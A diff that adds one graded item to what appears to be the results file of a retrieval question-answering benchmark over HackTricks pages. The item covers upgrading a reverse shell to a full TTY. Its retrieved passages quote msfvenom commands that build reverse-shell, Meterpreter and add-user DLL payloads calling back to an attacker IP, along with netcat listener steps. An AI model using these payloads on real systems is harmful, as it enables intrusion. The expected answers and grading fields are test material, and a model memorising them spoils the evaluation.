@@ -865,7 +865,97 @@
     }
    ],
    "error": null
+  },
+  {
+   "id": "q10",
+   "question": "after getting a basic reverse shell, how do I upgrade it to a full interactive TTY?",
+   "expect": "answer",
+   "kind": "HackTricks",
+   "files": [
+    "hacktricks/src/generic-hacking/reverse-shells/full-ttys.md"
+   ],
+   "evidence": [
+    "pty.spawn(\"/bin/bash\")",
+    "stty raw -echo; fg"
+   ],
+   "must": [
+    "stty raw -echo"
+   ],
+   "expected": "First give the shell a pseudo-terminal: `python3 -c 'import pty; pty.spawn(\"/bin/bash\")'` (or `script /dev/null -qc /bin/bash`). Then suspend it with Ctrl+Z and, in your own terminal, run `stty raw -echo; fg` to bring it back in raw mode. Inside the shell, set `export SHELL=/bin/bash`, `export TERM=screen`, match your real terminal size with `stty rows <n> columns <n>` (read your own values first with `stty -a`), then run `reset`.",
+   "seconds": 58.9,
+   "answer": "To upgrade a basic reverse shell to a full interactive TTY, you can use Penelope. Run `penelope` to listen on `0.0.0.0:4444` by default; incoming Unix-like shells can then be auto-upgraded and logged [2].",
+   "truncated": false,
+   "prompt_tokens": 973,
+   "answer_tokens": 58,
+   "passage_numbers": [],
+   "passage_in_context": false,
+   "page_in_context": true,
+   "cited": [
+    2
+   ],
+   "cites_passage": false,
+   "must_found": [],
+   "declined": false,
+   "check_problems": [],
+   "passages": [
+    {
+     "n": 1,
+     "source": "hacktricks/src/generic-hacking/reverse-shells/linux.md",
+     "section": "Full TTY",
+     "similarity": 0.7635,
+     "passage": false,
+     "page": false,
+     "evidence": false,
+     "also_in": [],
+     "text": "**Once you get a reverse shell**[ **read this page to obtain a full TTY**](full-ttys.md)**.**\n\nThe baseline reverse-shell payloads collected below are also documented in the HighOn.Coffee and PayloadsAllTheThings cheat sheets; verify interpreter and utility availability on the target before selecting one.<sup>[[1]](#references)[[4]](#references)</sup>"
+    },
+    {
+     "n": 2,
+     "source": "hacktricks/src/generic-hacking/reverse-shells/full-ttys.md",
+     "section": "Penelope",
+     "similarity": 0.7539,
+     "passage": false,
+     "page": true,
+     "evidence": false,
+     "also_in": [],
+     "text": "[Penelope](https://github.com/brightio/penelope) automatically upgrades Unix-like reverse shells to PTY, resizes Unix-like terminals, and logs shell interactions; for Windows shells it provides readline but not real-time terminal resizing.<sup>[[2]](#references)</sup>\n\n![Penelope reverse-shell handler interface](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)\n\nRun `penelope` to listen on `0.0.0.0:4444` by default; incoming Unix-like shells can then be auto-upgraded and logged.<sup>[[2]](#references)</sup>\n\n![Penelope handling and upgrading an incoming shell](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)"
+    },
+    {
+     "n": 3,
+     "source": "hacktricks/src/windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md",
+     "section": "**Meterpreter**",
+     "similarity": 0.6872,
+     "passage": false,
+     "page": false,
+     "evidence": false,
+     "also_in": [],
+     "text": "**Get rev shell (x64):**\n\n```bash\nmsfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll\n```\n\n**Get a meterpreter (x86):**\n\n```bash\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll\n```\n\n**Create a user (x86 I didn't see a x64 version):**\n\n```bash\nmsfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll\n```"
+    },
+    {
+     "n": 4,
+     "source": "hacktricks/src/network-services-pentesting/6000-pentesting-x11.md",
+     "section": "Get Shell",
+     "similarity": 0.6865,
+     "passage": false,
+     "page": false,
+     "evidence": false,
+     "also_in": [],
+     "text": "```text\nmsf> use exploit/unix/x11/x11_keyboard_exec\n```\n\nAnother approach:\n\n**Reverse Shell:** `xrdp` also allows taking a reverse shell via Netcat.<sup>[[4]](#references)</sup> Type the following command:\n\n```bash\n./xrdp.py <IP:0> --no-disp\n```\n\nIn the interface you can see the **R-shell** option.\n\nThen, start a **Netcat listener** in your local system on port `5555`.\n\n```bash\nnc -lvp 5555\n```\n\nThen, put your IP address and port in the **R-Shell** option and click on **R-shell** to get a shell."
+    },
+    {
+     "n": 5,
+     "source": "hacktricks/src/generic-hacking/reverse-shells/linux.md",
+     "section": "pwncat-cs",
+     "similarity": 0.6841,
+     "passage": false,
+     "page": false,
+     "evidence": false,
+     "also_in": [],
+     "text": "If you already have **any raw reverse shell** but want a listener that can set up a more usable session, `pwncat-cs` can handle the connection and attempt a remote PTY.<sup>[[7]](#references)</sup>\n\n```bash"
+    }
+   ],
+   "error": null
   }
  ],
- "updated": "2026-11-10 23:00"
+ "updated": "2026-11-10 23:01"
 }
